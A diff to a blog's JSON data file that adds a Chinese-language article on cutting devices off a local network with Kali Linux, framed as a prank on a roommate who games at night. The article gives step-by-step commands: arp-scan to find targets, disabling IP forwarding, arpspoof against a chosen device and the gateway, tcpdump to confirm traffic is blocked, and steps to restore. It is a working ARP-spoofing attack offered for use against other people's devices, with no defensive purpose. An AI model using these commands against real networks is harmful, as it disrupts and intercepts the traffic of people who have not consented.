@@ -6,6 +6,14 @@
   ],
   "articles": [
     {
+      "id": 30,
+      "title": "如何用kail linux实现断网攻击（局域网）",
+      "date": "2026-04-18 00:33:13",
+      "category": "linux",
+      "excerpt": "相比大家应该有大晚上不睡觉打游戏喊“妈妈”的舍友吧。\n对于这样的人我们必须重拳出击，欸嘿嘿~\n\n1....",
+      "content": "相比大家应该有大晚上不睡觉打游戏喊“妈妈”的舍友吧。\n对于这样的人我们必须重拳出击，欸嘿嘿~\n\n1. 查看网卡信息与 IP 地址\n\n\n# 1. 查看所有网卡信息，确认你的USB无线网卡（wlan0）\niw dev\nifconfig\n\n# 2. 确认USB网卡是否被正确识别\nlsusb | grep Ralink\n\n你会看到 Interface wlan0，以及你的 IP 地址（比如 192.168.100.197）\n确认 wlan0 已经连接上你的 WiFi\n（网卡买新一点的，内核太老的不支持）\n\n2. 安装必备工具（如果没装）\n\napt update && apt install -y arp-scan dsniff net-tools\n（arp-scan 用于扫描设备，dsniff 包含 arpspoof 工具）\n\n二、扫描局域网内所有设备（含手机、电脑）\n1. 一键扫描所有在线设备\n\n\n# 用你的USB网卡wlan0扫描整个网段\narp-scan -I wlan0 -l\n\n\n\n执行后会列出所有设备的：\nIP地址（比如 192.168.100.1 网关、192.168.100.199 手机）\nMAC地址\n设备厂商（Apple/Windows/Unknown\n\n\n\n设备类型\t\t\t\tIP 地址示例\t\t\t\t\t作用\n网关 / 路由器\t\t\txxx.xxx.xxx.x\t\t\t网络出入口，必须记录\n目标设备（手机 / 电脑）\txxx.xxx.xxx.xxx\t\t\t你要攻击的设备\n你的 Kali 主机\t\t\txxx.xxx.xxx.xxx\t\t\t攻击机本身\n\n\n三、断网攻击核心操作\n1. 关键前置：关闭 IP 转发（断网的核心！）\n\n# 关闭流量转发，让目标设备的流量无法通过你的虚拟机转发到外网\necho 0 > /proc/sys/net/ipv4/ip_forward\n\n# 验证是否关闭成功（输出必须是0）\ncat /proc/sys/net/ipv4/ip_forward\n\n\n2. 执行 ARP 欺骗（断网攻击）\n① 单设备断网（推荐，效果最稳）\n\n# 语法：arpspoof -i 网卡名 -t 目标IP 网关IP\narpspoof -i wlan0 -t 192.168.100.199 192.168.100.1\n\n\n\n-i wlan0：指定你的 USB 无线网卡\n-t 192.168.100.199：目标设备 IP（你的手机 / 电脑）\n192.168.100.1：网关 IP\n执行后终端会持续输出 192.168.100.199 is-at ...，说明欺骗包正在发送\n\n\n\n② 全设备断网（可选，谨慎使用）\n# 欺骗网关，让所有设备的流量都发给你（不转发=全网段断网）\narpspoof -i wlan0 -t 192.168.100.1 192.168.100.199\n\n\n\n四、攻击效果验证\n目标设备（手机 / 电脑）会显示 WiFi 已连接，但无法访问互联网\n在 Kali 中可以用 tcpdump 确认流量被拦截：\n\ntcpdump -i wlan0 host 192.168.100.199\n\n能看到目标设备的数据包，但没有任何响应，说明断网成功\n\n\n\n五、恢复网络\n\n# 按Ctrl + C 停止当前arpspoof命令\n# 如果卡住，强制杀掉进程\npkill arpspoof\n\n\n\n\n# 重新开启流量转发\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# 验证恢复成功（输出必须是1）\ncat /proc/sys/net/ipv4/ip_forward"
+    },
+    {
       "id": 29,
       "title": "大数阶乘",
       "date": "2026-04-16 21:59:42",
